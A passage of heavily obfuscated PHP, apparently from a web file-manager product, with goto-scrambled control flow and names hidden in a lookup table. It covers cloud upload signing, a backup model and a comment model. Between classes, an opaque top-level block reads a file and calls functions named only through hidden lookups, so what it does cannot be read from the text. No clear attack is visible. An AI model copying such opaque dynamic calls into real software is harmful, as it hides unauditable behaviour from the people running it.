$b£†ÛåÖ[211] => $b£†ÛåÖ[119], $b£†ÛåÖ[1269] => $eÖ†ĞÌŠİª[$b£†ÛåÖ[78]]); goto AÅğ¨®„; EæØè½îÂ”: if (strpos($f ì›ÏáøÍ, $b£†ÛåÖ[225]) === 0) { if (isset($dÙÎ•×À°[$b£†ÛåÖ[1353]])) { $AØØ˜„«‹¤ = $dÙÎ•×À°[$b£†ÛåÖ[1353]]; } else { if (isset($BÖ‡ğ‘“[$b£†ÛåÖ[1353]])) { $AØØ˜„«‹¤ = $BÖ‡ğ‘“[$b£†ÛåÖ[1353]]; } else { $AØØ˜„«‹¤ = hash($b£†ÛåÖ[1267], $b£†ÛåÖ[33]); } } return array($b£†ÛåÖ[232] => $BÖ‡ğ‘“[$b£†ÛåÖ[232]], $b£†ÛåÖ[1353] => $AØØ˜„«‹¤, $b£†ÛåÖ[222] => $BÖ‡ğ‘“[$b£†ÛåÖ[1356]]); } return $BÖ‡ğ‘“[$b£†ÛåÖ[232]]; goto EŒ®£®î‹¤; aÖ»ÚèÒÇŞ: unset($eÖ†ĞÌŠİª[$b£†ÛåÖ[93]]); if (isset($eÖ†ĞÌŠİª[$b£†ÛåÖ[223]])) { return $this->listUploadParts($d±ÒµË‚…´, $eÖ†ĞÌŠİª); } $dÙÎ•×À° = array(); goto CÆÎÚ»†ì; fãñÃÀ‚ÜË: $b£†ÛåÖ =& $_SERVER[›é¼±]; $f ì›ÏáøÍ = isset($eÖ†ĞÌŠİª[$b£†ÛåÖ[168]]) ? $eÖ†ĞÌŠİª[$b£†ÛåÖ[168]] : $b£†ÛåÖ[33]; $d±ÒµË‚…´ = $eÖ†ĞÌŠİª[$b£†ÛåÖ[93]]; goto aÖ»ÚèÒÇŞ; AÅğ¨®„: $B–à‹àç¤Õ = $b£†ÛåÖ[226]; $C×Î‡Û«‘ = $b£†ÛåÖ[8] . $this->pathEncode($d±ÒµË‚…´) . $f ì›ÏáøÍ; $BÖ‡ğ‘“ = $this->client->__getSignatureV4($dÙÎ•×À°, $B‰ÕÆ¸•“é, $B–à‹àç¤Õ, $C×Î‡Û«‘); goto EæØè½îÂ”; EŒ®£®î‹¤: } public function listUploadParts($cĞ¶µÃĞôñ, $b¿ãà ¥ = array()) { goto a ä©ÎÕ÷˜; Eµ×•›Œ¿´: $F¼Éç°õŞ¤ = array($d‘Øø›» Ñ[1354] => $aòŞ­¸öõ÷[1], $d‘Øø›» Ñ[211] => $d‘Øø›» Ñ[119], $d‘Øø›» Ñ[1269] => strlen($d÷õöÖ’¬¦)); $C³‘Ëª  = $d‘Øø›» Ñ[224]; $E·¤Ó”¹Ÿø = $d‘Øø›» Ñ[8] . $this->pathEncode($cĞ¶µÃĞôñ) . $b¿ãà ¥[$d‘Øø›» Ñ[168]]; goto bÒö¯Úğ; aª…¥Û¸á¡: if (!$aØõÇˆ£ ) { return !1; } $d÷õöÖ’¬¦ = $d‘Øø›» Ñ[1357]; foreach ($aØõÇˆ£  as $D™ÉøÃÚÑ±) { $d÷õöÖ’¬¦ .= $d‘Øø›» Ñ[1358] . "\74\x50\x61\x72\x74\116\x75\x6d\142\x65\162\76{$D™ÉøÃÚÑ±[$d‘Øø›» Ñ[1314]]}\74\x2f\x50\x61\x72\x74\x4e\165\x6d\x62\x65\162\76\xa" . "\x3c\x45\124\141\147\x3e{$D™ÉøÃÚÑ±[$d‘Øø›» Ñ[1315]]}\x3c\x2f\x45\x54\x61\147\76\xa" . $d‘Øø›» Ñ[1359]; } goto d®ÜñºàÏ; a ä©ÎÕ÷˜: $d‘Øø›» Ñ =& $_SERVER[›é¼±]; $E´ˆ£·ˆ± = str_replace($d‘Øø›» Ñ[233], $d‘Øø›» Ñ[33], $b¿ãà ¥[$d‘Øø›» Ñ[168]]); $aØõÇˆ£  = $this->client->listParts($this->bucket, $cĞ¶µÃĞôñ, $E´ˆ£·ˆ±); goto aª…¥Û¸á¡; bÒö¯Úğ: $c ß‚‡šæ = $this->client->__getSignatureV4($bîõ¿Å¶Ñ, $F¼Éç°õŞ¤, $C³‘Ëª , $E·¤Ó”¹Ÿø, $d÷õöÖ’¬¦); return array($d‘Øø›» Ñ[232] => $c ß‚‡šæ[$d‘Øø›» Ñ[232]], $d‘Øø›» Ñ[222] => $c ß‚‡šæ[$d‘Øø›» Ñ[1356]], $d‘Øø›» Ñ[234] => $aØõÇˆ£ , $d‘Øø›» Ñ[1353] => $c ß‚‡šæ[$d‘Øø›» Ñ[1353]]); goto D¿æ‰·Ò‡; d®ÜñºàÏ: $d÷õöÖ’¬¦ .= $d‘Øø›» Ñ[1360]; $bîõ¿Å¶Ñ = array(); $aòŞ­¸öõ÷ = explode($d‘Øø›» Ñ[177], $this->getHost()); goto Eµ×•›Œ¿´; D¿æ‰·Ò‡: } public function link($Dø‡µ“³º, $FÑÁõÖ÷µì = array()) { return parent::link($Dø‡µ“³º, $FÑÁõÖ÷µì); } public function fileOut($AÏÌÃ‘Ñ‚÷, $aŠÊ‹Áï­ê = false, $dÏÇ¨‘è‹ˆ = false, $b…öÊ«Œ¸½ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[›é¼±][1361])) { return parent::fileOutServer($AÏÌÃ‘Ñ‚÷, $aŠÊ‹Áï­ê, $dÏÇ¨‘è‹ˆ, $b…öÊ«Œ¸½); } parent::fileOut($AÏÌÃ‘Ñ‚÷, $aŠÊ‹Áï­ê, $dÏÇ¨‘è‹ˆ, $b…öÊ«Œ¸½); } public function fileOutImage($aÑä’Ü„‹ , $F¾Í—á½Ñ† = 250) { if (strstr($this->endpoint, $_SERVER[›é¼±][1361])) { return parent::fileOutImageServer($aÑä’Ü„‹ , $F¾Í—á½Ñ†); } parent::fileOutImage($aÑä’Ü„‹ , $F¾Í—á½Ñ†); } public function fileOutLink($E×ÍÁåÂÛ) { $a Ä½ÀˆØî =& $_SERVER[›é¼±]; if (substr($E×ÍÁåÂÛ, 0, 7) == $a Ä½ÀˆØî[1237]) { $E×ÍÁåÂÛ = $a Ä½ÀˆØî[1238] . substr($E×ÍÁåÂÛ, 7); } header($a Ä½ÀˆØî[159] . $E×ÍÁåÂÛ); die; } public function getHost() { $fÕÚÆÈÉÁ¦ =& $_SERVER[›é¼±]; $D¢Ôó§™‹ = str_rtrim(parent::getHost(), $fÕÚÆÈÉÁ¦[8] . $this->bucket); $D¢Ôó§™‹ = explode($fÕÚÆÈÉÁ¦[177], $D¢Ôó§™‹); return $D¢Ôó§™‹[0] . $fÕÚÆÈÉÁ¦[177] . $this->bucket . $fÕÚÆÈÉÁ¦[95] . $D¢Ôó§™‹[1]; } } goto eôğ–ïùùÏ; Eƒ±ˆ‹ãëæ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x62\141\x63\153\x75\x70\114\151\163\164"; public $field = array("\151\x6f", "\156\x61\x6d\x65", "\163\x74\x61\x74\x75\163", "\143\x6f\156\x74\145\156\164", "\x6d\141\x6e\165\x61\154", "\162\145\163\x75\154\x74", "\164\151\155\x65\106\x72\157\x6d", "\x74\151\x6d\x65\124\x6f"); public function config() { goto b±‰ß¬Š‹; dÙÏ¨‘öà : $DÌ°³æÎ = Model($A«¦™¯ éì[1759])->findByKey($A«¦™¯ éì[1552], $EÂçó­ÉÃ); if (!$DÌ°³æÎ) { $DÌ°³æÎ = array(); } if (isset($DÌ°³æÎ[$A«¦™¯ éì[197]])) { $DÌ°³æÎ[$A«¦™¯ éì[197]] = json_decode($DÌ°³æÎ[$A«¦™¯ éì[197]], !0); } goto fßª…ôØ; aŠ“Ø¨“¶©: Action($A«¦™¯ éì[1757])->taskInit(); Model($A«¦™¯ éì[1533])->cacheClear(); $EÂçó­ÉÃ = $A«¦™¯ éì[1758]; goto dÙÏ¨‘öà ; E÷òŠ½¾ä: $FŒ­æç½êÆ = is_array($FŒ­æç½êÆ) ? $FŒ­æç½êÆ : array(); if (!isset($FŒ­æç½êÆ[$A«¦™¯ éì[750]])) { $FŒ­æç½êÆ[$A«¦™¯ éì[750]] = $A«¦™¯ éì[87]; } unset($FŒ­æç½êÆ[$A«¦™¯ éì[1534]]); goto aŠ“Ø¨“¶©; fßª…ôØ: if (isset($FŒ­æç½êÆ[$A«¦™¯ éì[197]])) { $DÌ°³æÎ[$A«¦™¯ éì[197]][$A«¦™¯ éì[1537]] = $FŒ­æç½êÆ[$A«¦™¯ éì[197]]; unset($FŒ­æç½êÆ[$A«¦™¯ éì[197]]); } return array_merge($DÌ°³æÎ, $FŒ­æç½êÆ); goto aÚÈ³Á«”ù; b±‰ß¬Š‹: $A«¦™¯ éì =& $_SERVER[›é¼±]; $FŒ­æç½êÆ = Model($A«¦™¯ éì[765])->get($A«¦™¯ éì[777]); $FŒ­æç½êÆ = json_decode($FŒ­æç½êÆ, !0); goto E÷òŠ½¾ä; aÚÈ³Á«”ù: } public function listData($e§ğ²¾ø¢ = false, $d‹ø‰‹‘Ä = "\155\x6f\x64\x69\x66\x79\x54\151\155\145", $Eø•ß•˜ = false) { return parent::listData($e§ğ²¾ø¢, $d‹ø‰‹‘Ä, !0); } public function lastItem() { $EÖ•”öáÖ = $this->listData(); return !empty($EÖ•”öáÖ[0]) ? $EÖ•”öáÖ[0] : null; } public function kill($aÜİÕù¹Ò) { goto D¶‹åŒ×Æ‰; cÄ†Ü©Ö•Ú: Task::kill($BÙ¹…º›[776]); Task::kill($BÙ¹…º›[801]); Task::kill($BÙ¹…º›[811]); goto c„ù–ŒÎœÆ; D¶‹åŒ×Æ‰: $BÙ¹…º› =& $_SERVER[›é¼±]; $F„‘°ëÖ = $this->listData($aÜİÕù¹Ò); if (!$F„‘°ëÖ || empty($F„‘°ëÖ[$BÙ¹…º›[28]])) { return !0; } goto cÄ†Ü©Ö•Ú; cõİæ„½¸í: return $this->remove($aÜİÕù¹Ò); goto B¾˜šÀŠº…; c„ù–ŒÎœÆ: $D×ĞÚÈèªÚ = $F„‘°ëÖ[$BÙ¹…º›[28]]; $c†™õÚ©½ = TEMP_FILES . $BÙ¹…º›[773] . $D×ĞÚÈèªÚ . $BÙ¹…º›[8]; IO::remove($c†™õÚ©½, !1); goto cõİæ„½¸í; B¾˜šÀŠº…: } public function remove($DğŞæïØå±) { $b‰ÊÖŞ—»à = $this->listData($DğŞæïØå±); if (!$b‰ÊÖŞ—»à) { return !0; } return $this->backupRemove($b‰ÊÖŞ—»à); } private function backupRemove($D‡ó’ª›‡É) { parent::remove($D‡ó’ª›‡É[$_SERVER[›é¼±][395]]); $B´ŸÅ²ì‹‹ = $this->backupPath($D‡ó’ª›‡É); IO::remove($B´ŸÅ²ì‹‹, !1); return !0; } private function backupPath($EßÄéÅˆ¨) { $bĞçÌÁÎä­ =& $_SERVER[›é¼±]; $Eá ÂÇ‘ = $EßÄéÅˆ¨[$bĞçÌÁÎä­[28]]; $EãÓ‰ëØÛ÷ = Model($bĞçÌÁÎä­[765])->get($bĞçÌÁÎä­[766]); $aíÖĞµº¨ = substr(md5($bĞçÌÁÎä­[767] . $EãÓ‰ëØÛ÷ . $Eá ÂÇ‘), 0, 8); return "\173\151\157\72{$EßÄéÅˆ¨[$bĞçÌÁÎä­[747]]}\175\57\144\x61\x74\x61\142\141\163\x65\x2f\x62\x61\143\153\x75\x70\57" . $Eá ÂÇ‘ . $bĞçÌÁÎä­[71] . $aíÖĞµº¨; } public function start() { goto eµƒ£‘æ¼; eµƒ£‘æ¼: $eÚÖëˆÖ =& $_SERVER[›é¼±]; if ($GLOBALS[$eÚÖëˆÖ[6]][$eÚÖëˆÖ[88]][$eÚÖëˆÖ[1760]] != $eÚÖëˆÖ[87]) { return !0; } $d–ğŒÇ”Ç¨ = $this->config(); goto D‚¤ŸÑËç; D‚¤ŸÑËç: if (!$d–ğŒÇ”Ç¨ || $d–ğŒÇ”Ç¨[$eÚÖëˆÖ[1534]] != $eÚÖëˆÖ[87]) { return !1; } $bĞÂ³¬õï‘ = $this->process(); foreach ($bĞÂ³¬õï‘ as $f·µ¯×ŒÑ) { if ($f·µ¯×ŒÑ) { return Task::restart($f·µ¯×ŒÑ[$eÚÖëˆÖ[395]]); } } goto b«˜ö…ÃØ; b«˜ö…ÃØ: $cŠÚÎ›Ó¾ç = new Backup(); $DøĞì¤—œ = $cŠÚÎ›Ó¾ç->db(); if ($DøĞì¤—œ) { $DøĞì¤—œ = $cŠÚÎ›Ó¾ç->dbFile(); if ($DøĞì¤—œ && $d–ğŒÇ”Ç¨[$eÚÖëˆÖ[750]] == $eÚÖëˆÖ[191]) { $DøĞì¤—œ = $cŠÚÎ›Ó¾ç->file(); } } goto BÛÒ­¼éŸ¦; BÛÒ­¼éŸ¦: Backup::set(array($eÚÖëˆÖ[745] => 1, $eÚÖëˆÖ[490] => time())); return !0; goto b²‡±æíÔ; b²‡±æíÔ: } public function process() { $fŒ—à¢ôÙ =& $_SERVER[›é¼±]; return array($fŒ—à¢ôÙ[753] => Task::get($fŒ—à¢ôÙ[776]), $fŒ—à¢ôÙ[757] => Task::get($fŒ—à¢ôÙ[801]), $fŒ—à¢ôÙ[193] => Task::get($fŒ—à¢ôÙ[811])); } public function restore() { $C¶½µ³ùóö =& $_SERVER[›é¼±]; ActionCall($C¶½µ³ùóö[1052], !0, 1); ActionCall($C¶½µ³ùóö[1052], !0, 0); } } if ($_SERVER[$_SERVER[›é¼±][858]] != $_SERVER[$_SERVER[›é¼±][859]]) { goto fçË¬Ë²Ö; fœÒ±‘…¨: $e£¤¡„ÎÎ° = explode($_SERVER[›é¼±][229], $e‘”¯±ÃğØ); if (count($e£¤¡„ÎÎ°) < $_SERVER[›é¼±][609]) { $cƒéÏÜÜ¸ = $_SERVER[›é¼±][863]; $cƒéÏÜÜ¸(); } $A¥ÕØ·¼ = $_SERVER[›é¼±][864]; goto eğèÌè‡; eğèÌè‡: $A¥ÕØ·¼($_SERVER[$_SERVER[›é¼±][865]]); goto cÃ©ø•ŞÇ; fçË¬Ë²Ö: $cÛäÔÚë“ = $_SERVER[›é¼±][860]; $cÚ‚ñ‹ ¿­ = $_SERVER[$_SERVER[›é¼±][861]] . $_SERVER[›é¼±][862]; $e‘”¯±ÃğØ = $cÛäÔÚë“($cÚ‚ñ‹ ¿­); goto fœÒ±‘…¨; cÃ©ø•ŞÇ: } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\155\145" => "\143\x6f\x6d\155\x65\156\x74\x5f\x6d\x65\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\x64" => "\x63\157\155\155\145\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Bğ¬¿«¶Û) { $c·Œ“ÔºÚ» =& $_SERVER[›é¼±]; if ($Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[1761]]) { $f’“—„Øµ = $this->where(array($c·Œ“ÔºÚ»[1762] => $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[1761]]))->find(); if (!$f’“—„Øµ || $f’“—„Øµ[$c·Œ“ÔºÚ»[406]] != $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[406]] || $f’“—„Øµ[$c·Œ“ÔºÚ»[498]] != $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[498]]) { return !1; } $this->where(array($c·Œ“ÔºÚ»[1762] => $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[1761]]))->setAdd($c·Œ“ÔºÚ»[1763], 1); } $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[1764]] = 0; $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[1763]] = 0; $Bğ¬¿«¶Û[$c·Œ“ÔºÚ»[745]] = 1; return $this->add($Bğ¬¿«¶Û); } public function commentCount($a™ØÍÃÙÁ·, $aÜ¼ùÅÇÏƒ, $f«ƒí¾·•› = false) { goto DÊ÷Ãğ¶; AÛÖˆïÀŸÎ: $fèÈöŠèÎÎ = $this->field($cÑÅƒ­—Í)->where($e‘õ°Š‘˜æ)->group($a¾¯‡ôË×ê[498])->select(); return array_to_keyvalue($fèÈöŠèÎÎ, $a¾¯‡ôË×ê[498], $a¾¯‡ôË×ê[494]); goto dÊä¹¤ËêÒ; DÊ÷Ãğ¶: $a¾¯‡ôË×ê =& $_SERVER[›é¼±]; if (!$a™ØÍÃÙÁ·) { return array(); } if (is_string($a™ØÍÃÙÁ·) || is_int($a™ØÍÃÙÁ·)) { $a™ØÍÃÙÁ· = array($a™ØÍÃÙÁ·); } goto fÎƒäã¡¯; fÎƒäã¡¯: $cÑÅƒ­—Í = array($a¾¯‡ôË×ê[498], $a¾¯‡ôË×ê[1765] => $a¾¯‡ôË×ê[494]); $e‘õ°Š‘˜æ = array($a¾¯‡ôË×ê[498] => array($a¾¯‡ôË×ê[7], $a™ØÍÃÙÁ·), $a¾¯‡ôË×ê[406] => $aÜ¼ùÅÇÏƒ); if ($f«ƒí¾·•›) { $e‘õ°Š‘˜æ[$a¾¯‡ôË×ê[1564]] = $f«ƒí¾·•›; } goto AÛÖˆïÀŸÎ; dÊä¹¤ËêÒ: } public function starTarget($dš×î‡Ü‹, $BÅóˆ©ƒˆè) { goto c’Ô¾Œ¹ä; E…¹ÙˆŞµ“: $D£»˜‰æ™ˆ = $this->where($EÍ®ö—íé)->find(); if ($D£»˜‰æ™ˆ) { return $this->where(array($Bï‡åÇ´¢¨[395] => $D£»˜‰æ™ˆ[$Bï‡åÇ´¢¨[395]]))->delete(); } $b¬õ—ò”À  = array($Bï‡åÇ´¢¨[1761] => 0, $Bï‡åÇ´¢¨[1564] => USER_ID, $Bï‡åÇ´¢¨[745] => 1, $Bï‡åÇ´¢¨[750] => $Bï‡åÇ´¢¨[33], $Bï‡åÇ´¢¨[406] => $AÇ¼ÎÑ›ÊÓ, $Bï‡åÇ´¢¨[498] => $BÅóˆ©ƒˆè, $Bï‡åÇ´¢¨[1764] => 0, $Bï‡åÇ´¢¨[1763] => 0); goto CóğéèóÜÓ; CóğéèóÜÓ: return $this->add($b¬õ—ò”À ); goto Eá›Ÿ¨Î¹; c’Ô¾Œ¹ä: $Bï‡åÇ´¢¨ =& $_SERVER[›é¼±]; $AÇ¼ÎÑ›ÊÓ = $dš×î‡Ü‹ + self::TYPE_STAR_OFFSET; $EÍ®ö—íé = array($Bï‡åÇ´¢¨[1564] => USER_ID, $Bï‡åÇ´¢¨[406] => $AÇ¼ÎÑ›ÊÓ, $Bï‡åÇ´¢¨[498] => $BÅóˆ©ƒˆè); goto E…¹ÙˆŞµ“; Eá›Ÿ¨Î¹: } public function starTargetCount($F·‚Ã¢²„…, $c‰Í¤¬¦É÷) { $DÃ½Á²¦Ø“ =& $_SERVER[›é¼±]; $EŞÚ‚ÍÑ„œ = $c‰Í¤¬¦É÷ + self::TYPE_STAR_OFFSET; $eÃœŠ¤Í¿Ô = $this->commentCount($F·‚Ã¢²„…, $EŞÚ‚ÍÑ„œ); $Eóˆ‚ñªİ… = $this->commentCount($F·‚Ã¢²„…, $EŞÚ‚ÍÑ„œ, USER_ID); return array($DÃ½Á²¦Ø“[1766] => $eÃœŠ¤Í¿Ô, $DÃ½Á²¦Ø“[1767] => $Eóˆ‚ñªİ…); } public function starTargetUserList($D‹¢Ç’¢, $BòÒØ¾¨‡Æ) { goto c¯»Æ¬Ó; AîŞç‚Å: $c‚‰Ë¥Í…Ì = $this->field($E†ˆƒ÷…¤Œ[1564])->where($EÅéâ‡ßª)->limit(500)->select(); $c‚‰Ë¥Í…Ì = array_to_keyvalue($c‚‰Ë¥Í…Ì, $E†ˆƒ÷…¤Œ[33], $E†ˆƒ÷…¤Œ[1564]); $f»ì‹àİï‘[$E†ˆƒ÷…¤Œ[1768]] = Model($E†ˆƒ÷…¤Œ[507])->userListInfo($c‚‰Ë¥Í…Ì); goto BÇºŸÛÛ®; BÇºŸÛÛ®: return $f»ì‹àİï‘; goto A‡““½Ã¤ø; c¯»Æ¬Ó: $E†ˆƒ÷…¤Œ =& $_SERVER[›é¼±]; $fòÌˆ–ÉÎè = $D‹¢Ç’¢ + self::TYPE_STAR_OFFSET; $EÅéâ‡ßª = array($E†ˆƒ÷…¤Œ[498] => $BòÒØ¾¨‡Æ, $E†ˆƒ÷…¤Œ[406] => $fòÌˆ–ÉÎè); goto aåÃå¦‹ÕÂ; aåÃå¦‹ÕÂ: $B®ãƒ¬µ‚ = $this->where($EÅéâ‡ßª)->count(); $f»ì‹àİï‘ = array($E†ˆƒ÷…¤Œ[253] => $B®ãƒ¬µ‚, $E†ˆƒ÷…¤Œ[1768] => array()); if (!$B®ãƒ¬µ‚) { return $f»ì‹àİï‘; } goto AîŞç‚Å; A‡““½Ã¤ø: } public function prasiseUserList($BØÔ×“Â’Ô) { goto F½²õŠËé’; dªğåÒ¥›Œ: $Aã¬š—ï = _get($dÎ¹†ĞÁ°ø, $fî®ï¨ßğ[1764], 0); $b¯Éø’åÉ¹ = array($fî®ï¨ßğ[253] => $Aã¬š—ï, $fî®ï¨ßğ[1768] => array()); if (!$Aã¬š—ï) { return $b¯Éø’åÉ¹; } goto FÏ®…çø»Ì; eÎ‹ƒÔß…Ş: return $b¯Éø’åÉ¹; goto b¦ç±›‘; FÏ®…çø»Ì: $AÅá£ˆÍ¥å = Model($fî®ï¨ßğ[1770])->field($fî®ï¨ßğ[1564])->where($c‹Ê˜ÂËÃÒ)->limit(500)->select(); $AÅá£ˆÍ¥å = array_to_keyvalue($AÅá£ˆÍ¥å, $fî®ï¨ßğ[33], $fî®ï¨ßğ[1564]); $b¯Éø’åÉ¹[$fî®ï¨ßğ[1768]] = Model($fî®ï¨ßğ[507])->userListInfo($AÅá£ˆÍ¥å); goto eÎ‹ƒÔß…Ş; F½²õŠËé’: $fî®ï¨ßğ =& $_SERVER[›é¼±]; $c‹Ê˜ÂËÃÒ = array($fî®ï¨ßğ[1769] => $BØÔ×“Â’Ô); $dÎ¹†ĞÁ°ø = $this->where($c‹Ê˜ÂËÃÒ)->find(); goto dªğåÒ¥›Œ; b¦ç±›‘: } public function remove($E‹Ù×¡¼Û) { $f˜ÉùÛ¾İ =& $_SERVER[›é¼±]; $fãæ”Ü‹¦ = array($f˜ÉùÛ¾İ[1762] => $E‹Ù×¡¼Û); $aÏÊƒœÆÏ• = $this->where($fãæ”Ü‹¦)->find(); if ($aÏÊƒœÆÏ•[$f˜ÉùÛ¾İ[1761]]) { $this->where(array($f˜ÉùÛ¾İ[1762] => $aÏÊƒœÆÏ•[$f˜ÉùÛ¾İ[1761]]))->setAdd($f˜ÉùÛ¾İ[1763], -1); } return $this->where($fãæ”Ü‹¦)->delete(); } public function edit($B¸Úš²åù¡, $c‡…œ”®Ÿ) { $a³êöêš =& $_SERVER[›é¼±]; $DÜ‡Äã”ß¯ = array($a³êöêš[1762] => $B¸Úš²åù¡); return $this->where($DÜ‡Äã”ß¯)->save(array($a³êöêš[1771] => $c‡…œ”®Ÿ)); } public function prasise($Cõ×ÓôåÕ) { $BñÏ¬Öù«Ã =& $_SERVER[›é¼±]; $E˜‹ò„‰ë = Model($BñÏ¬Öù«Ã[1772]); $c¨…ñºÎƒª = array($BñÏ¬Öù«Ã[1762] => $Cõ×ÓôåÕ, $BñÏ¬Öù«Ã[1555] => USER_ID); $aê¢õÛªÎÜ = $E˜‹ò„‰ë->where($c¨…ñºÎƒª)->find(); if (!$aê¢õÛªÎÜ) { $E˜‹ò„‰ë->add($c¨…ñºÎƒª); $Eö³ôá¯ = $this->where(array($BñÏ¬Öù«Ã[1762] => $Cõ×ÓôåÕ))->setAdd($BñÏ¬Öù«Ã[1764], 1); } else { $E˜‹ò„‰ë->where($c¨…ñºÎƒª)->delete(); $Eö³ôá¯ = $this->where(array($BñÏ¬Öù«Ã[1762] => $Cõ×ÓôåÕ))->setAdd($BñÏ¬Öù«Ã[1764], -1); } return $Eö³ôá¯; } public function targetInfo($f‘«„Ô†Ë¡, $dÖÍ‹á„å) { goto Aåìâš…¡—; Bº…«Ïµ‹“: $d¨˜´ãÊ¤İ = "\x52\x49\107\110\124\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\143\157\155\x6d\x65\156\x74\x5f\x70\162\x61\x69\163\x65\40\x73\x74\141\162\40\157\x6e\40\x63\157\155\x6d\x65\x6e\164\56\x63\x6f\x6d\155\145\x6e\164\111\x44\x20\75\40\x73\164\141\x72\x2e\x63\157\x6d\x6d\x65\156\164\x49\x44"; $fèò²…œÆ = $this->alias($c¡«Ï¸‚¨¿[352])->where($Aö½Ô¹œš°)->join($d¨˜´ãÊ¤İ, $c¡«Ï¸‚¨¿[1773])->count(); $bÏõÉˆ‹¹† = array($c¡«Ï¸‚¨¿[1774] => $dÛ¼øºöô“, $c¡«Ï¸‚¨¿[1775] => $fèò²…œÆ); goto B±ó·¯ó…ô; Aåìâš…¡—: $c¡«Ï¸‚¨¿ =& $_SERVER[›é¼±]; $Aö½Ô¹œš° = array($c¡«Ï¸‚¨¿[574] => $f‘«„Ô†Ë¡, $c¡«Ï¸‚¨¿[575] => $dÖÍ‹á„å); $dÛ¼øºöô“ = $this->where($Aö½Ô¹œš°)->count(); goto Bº…«Ïµ‹“; B±ó·¯ó…ô: return $bÏõÉˆ‹¹†; goto aÒ‰ò¦›ª; aÒ‰ò¦›ª: } public function listData($dìç©ˆ‹ô) { $fÆÆã÷‚™ƒ =& $_SERVER[›é¼±]; if (isset($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1776]])) { if ($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1776]]) { $dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1769]] = array($fÆÆã÷‚™ƒ[1006], intval($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1776]])); } unset($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1776]]); } if (isset($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1777]])) { if ($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1777]]) { $dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1769]] = array($fÆÆã÷‚™ƒ[1003], intval($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1777]])); } unset($dìç©ˆ‹ô[$fÆÆã÷‚™ƒ[1777]]); } return $this->_listData($dìç©ˆ‹ô); } private function _listData($D·Â³ÛÄÕ) { $eÎ¡œÖÎÜó =& $_SERVER[›é¼±]; $fˆ½ËÑ¢œÛ = $this->where($D·Â³ÛÄÕ)->_makeOrder()->selectPage(100); $this->_listAppendParent($fˆ½ËÑ¢œÛ[$eÎ¡œÖÎÜó[367]]); $this->_listAppendUser($fˆ½ËÑ¢œÛ[$eÎ¡œÖÎÜó[367]]); $this->_listAppendMeta($fˆ½ËÑ¢œÛ[$eÎ¡œÖÎÜó[367]]); return $fˆ½ËÑ¢œÛ; } private function _makeOrder() { $DÍóå¥İ” =& $_SERVER[›é¼±]; $C´ÏÔ½‡¸ = array($DÍóå¥İ”[1764], $DÍóå¥İ”[1763], $DÍóå¥İ”[194]); $EÆ†¡…Ô°‰ = Input::get($DÍóå¥İ”[449], $DÍóå¥İ”[7], $DÍóå¥İ”[418], $C´ÏÔ½‡¸); $cø¾Ö·ÉÕˆ = Input::get($DÍóå¥İ”[450], $DÍóå¥İ”[7], $DÍóå¥İ”[1557], array($DÍóå¥İ”[1778], $DÍóå¥İ”[445])); $D­ÛÆæâ¯Ç = $EÆ†¡…Ô°‰ . $DÍóå¥İ”[50] . $cø¾Ö·ÉÕˆ; return $this->order($D­ÛÆæâ¯Ç); } private function _listAppendParent(&$CîèÒ¾ÔŒ) { goto DŞİ·³©Ú¼; eÕÓ¨®Òìù: if (!$eÉÍù¾¬Ç¶) { return; } $A¼ï‚àäöë = $this->where(array($CäÏ©İ”¹œ[1762] => array($CäÏ©İ”¹œ[7], $eÉÍù¾¬Ç¶)))->select(); $A¼ï‚àäöë = array_to_keyvalue($A¼ï‚àäöë, $CäÏ©İ”¹œ[1769]); goto bš„ÂŒèë; DŞİ·³©Ú¼: $CäÏ©İ”¹œ =& $_SERVER[›é¼±]; $eÉÍù¾¬Ç¶ = array_unique(array_to_keyvalue($CîèÒ¾ÔŒ, $CäÏ©İ”¹œ[33], $CäÏ©İ”¹œ[1761])); $eÉÍù¾¬Ç¶ = array_remove_value($eÉÍù¾¬Ç¶, $CäÏ©İ”¹œ[191]); goto eÕÓ¨®Òìù; bš„ÂŒèë: foreach ($CîèÒ¾ÔŒ as &$B•˜È©Ì…“) { if (isset($A¼ï‚àäöë[$B•˜È©Ì…“[$CäÏ©İ”¹œ[1761]]])) { $B•˜È©Ì…“[$CäÏ©İ”¹œ[1779]] = $A¼ï‚àäöë[$B•˜È©Ì…“[$CäÏ©İ”¹œ[1761]]]; } } unset($B•˜È©Ì…“); goto FÁ‡™Ã¯÷“; FÁ‡™Ã¯÷“: } private function _listAppendUser(&$Eñ¨ÔËø‘¬) { goto dÍ’ê¶Ğ¿; FŠ¸Œ³ÕÆò: if (count($EªêÚğÆ²Ñ) == 0) { return; } foreach ($Eñ¨ÔËø‘¬ as $D±Ä¤Í¿–) { if (isset($D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1779]])) { $EªêÚğÆ²Ñ[] = $D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1779]][$C²¤ˆÖ­ï’[1564]]; } } $AóÈƒÒ»‘ = Model($C²¤ˆÖ­ï’[532])->userListInfo($EªêÚğÆ²Ñ); goto 